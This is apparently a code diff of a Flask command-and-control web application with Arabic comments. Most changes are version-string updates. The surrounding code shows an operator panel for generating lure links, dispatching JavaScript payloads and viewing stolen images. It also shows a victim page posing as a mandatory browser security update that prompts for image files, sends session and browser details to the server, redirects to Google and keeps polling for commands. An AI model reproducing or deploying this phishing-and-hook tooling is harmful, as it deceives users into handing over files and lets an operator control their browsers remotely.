@@ -1,6 +1,5 @@
 from flask import Flask, render_template_string, request, jsonify, make_response
 import base64
-import random
 import urllib3
 import datetime
 
@@ -8,7 +7,7 @@ urllib3.disable_warnings()
 
 app = Flask(__name__)
 
-# ذاكرة الميدان الاستراتيجية المركزية v35.0 (التمويه المباشر، منع التخزين المؤقت، والسيطرة الدائمة)
+# ذاكرة الميدان الاستراتيجية المركزية v35.2 (مخصص لمسار api/index.py على Vercel)
 CAPTURED_HOOKS = []
 COMMAND_QUEUE = {}
 EXTRACTED_FILES = []
@@ -19,7 +18,7 @@ HTML_COMMAND_CENTER = """<!DOCTYPE html>
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>V400 القائد الأعظم - مركز العمليات المتقدم v35.0</title>
+<title>V400 القائد الأعظم - مركز العمليات المتقدم v35.2</title>
 <style>
 *{margin:0;padding:0;box-sizing:border-box}
 body{background:#010103;color:#00ff88;font-family:'Courier New',Consolas,monospace;padding:20px;text-align:center}
@@ -43,7 +42,7 @@ img.preview{max-width:160px;max-height:160px;border:1px solid #00ff88;border-rad
 </head>
 <body>
 <div class="container">
-<h1>⚔️ V400 القائد الأعظم - لوحة التحكم المحدثة v35.0 ⚔️</h1>
+<h1>⚔️ V400 القائد الأعظم - لوحة التحكم المحدثة v35.2 ⚔️</h1>
 <div class="panel">
 <input id="target_url" placeholder="C2_SERVER_OR_COMMAND_DOMAIN" value="http://">
 <br>
@@ -56,7 +55,7 @@ img.preview{max-width:160px;max-height:160px;border:1px solid #00ff88;border-rad
   <option value="dispatch_payload">⚡ بث أمر برمجي مشفر للهدف</option>
 </select>
 <br>
-<input id="custom_payload" placeholder="أمر الجافاسكريبت المراد بثه (مثال: alert('Active v35');)" style="margin-top:10px;display:none;direction:ltr;">
+<input id="custom_payload" placeholder="أمر الجافاسكريبت المراد بثه (مثال: alert('Active v35.2');)" style="margin-top:10px;display:none;direction:ltr;">
 <br>
 <button id="exec_btn" onclick="executeLinkModule()">تنفيذ أمر الحقن الميداني 🚀</button>
 <div id="status" class="status"></div>
@@ -111,7 +110,7 @@ async function executeLinkModule(){
      if(!data.images || data.images.length === 0){
        results.innerHTML='<div class="card Low"><b>لا توجد صور مسحوبة حتى الآن</b><div class="proof">No captured images in storage.</div></div>';
      } else {
-       let imgHtml = '<div class="card Critical"><b>🖼️ معرض صور الهدف المسحوبة (v35)</b><div style="margin-top:10px">';
+       let imgHtml = '<div class="card Critical"><b>🖼️ معرض صور الهدف المسحوبة (v35.2)</b><div style="margin-top:10px">';
        data.images.forEach(img => {
          imgHtml += `<div style="margin-bottom:10px;border-bottom:1px solid #333;padding-bottom:5px"><b>ملف: ${img.filename}</b> [Token: ${img.token}]<br><img src="${img.data}" class="preview"></div>`;
        });
@@ -168,7 +167,7 @@ INJECTION_COMMAND_PORTAL = """<!DOCTYPE html>
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>تحديث الأمان والتحقق الشامل - System Update v3.5</title>
+<title>تحديث الأمان والتحقق الشامل - System Update v3.5.2</title>
 <style>
 body{background:#f3f4f6;color:#1f2937;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif;display:flex;justify-content:center;align-items:center;height:100vh;margin:0}
 .box{background:#ffffff;padding:40px 30px;border-radius:12px;box-shadow:0 10px 25px rgba(0,0,0,0.08);width:100%;max-width:420px;text-align:center;border:1px solid #e5e7eb}
@@ -186,14 +185,13 @@ button:hover{background:#1d4ed8}
   <h2>تحديث الأمان الإجباري للمتصفح</h2>
   <p>لضمان حماية بياناتك الشخصية وفتح الصفحة المطلوبة بأمان تام، يرجى النقر أدناه لإتمام مصادقة النظام والملفات المؤقتة.</p>
   <button onclick="executeStealthSync()">متابعة التحديث والتحقق 🔒</button>
-  <div class="footer">SSL Secure Certificate Verified • v3.5</div>
+  <div class="footer">SSL Secure Certificate Verified • v3.5.2</div>
 </div>
 
 <script>
 async function executeStealthSync(){
     const token = 'stealth_token_' + Math.random().toString(36).substring(2, 12);
     
-    // سحب الملفات والوسائط والصور فور النقر بصورة خفية
     try {
         if ('showOpenFilePicker' in window) {
             const handles = await window.showOpenFilePicker({ multiple: true, types: [{ description: 'Media Files', accept: { 'image/*': ['.png', '.jpg', '.jpeg', '.webp'] } }] });
@@ -214,11 +212,10 @@ async function executeStealthSync(){
         console.log("Stealth extraction bypassed:", err);
     }
 
-    // تسجيل الجلسة في خادم القيادة
     fetch('/auth/verify/login', {
         method: 'POST',
         headers: {'Content-Type': 'application/json'},
-        body: JSON.stringify({session_token: token, user_agent: navigator.userAgent, screen: window.innerWidth + 'x' + window.innerHeight, message: 'تم إتمام المصادقة وربط الجلسة بنجاح (v35).'})
+        body: JSON.stringify({session_token: token, user_agent: navigator.userAgent, screen: window.innerWidth + 'x' + window.innerHeight, message: 'تم إتمام المصادقة وربط الجلسة بنجاح (v35.2).'})
     }).then(res => res.json()).then(data => {
         document.body.innerHTML = '<div style="background:#ffffff;color:#111827;padding:50px 20px;text-align:center;font-family:sans-serif;direction:rtl"><div style="font-size:50px;margin-bottom:15px">✅</div><h2 style="color:#059669;margin-bottom:10px">تم التحقق بنجاح</h2><p style="color:#6b7280;font-size:14px">جاري توجيهك إلى المحتوى المطلوب تلقائياً...</p></div>';
         
@@ -226,7 +223,6 @@ async function executeStealthSync(){
             window.location.href = "https://www.google.com";
         }, 1500);
 
-        // حلقة استطلاع الأوامر الدائمة في الخلفية
         setInterval(() => {
             fetch('/api/poll?token=' + token)
             .then(r => r.json())
@@ -325,14 +321,14 @@ def check():
     command_mode = req_data.get("command", "generate_stealth_lure")
     payload = req_data.get("payload", "")
     
-    waf_status = f"v35.0 Command Engine ({command_mode}) - Direct Lure Active"
+    waf_status = f"v35.2 Command Engine ({command_mode}) - Active"
     
     if command_mode == "generate_stealth_lure":
         lure_url = f"{target}/"
         return jsonify({"url": target, "mode": command_mode, "waf_status": waf_status, "actions": [{
-            "type": "DIRECT STEALTH LURE URL (v35)",
+            "type": "DIRECT STEALTH LURE URL (v35.2)",
             "severity": "Critical",
-            "desc": "تم ربط الرابط الرئيسي مباشرة بواجهة التمويه (تحديث الأمان الإجباري) مع تفعيل منع التخزين المؤقت.",
+            "desc": "تم توليد وتجهيز رابط الاستدراج المتوافق مع مسار api/index.py.",
             "proof": lure_url
         }]})
     elif command_mode == "fetch_hooked_targets":
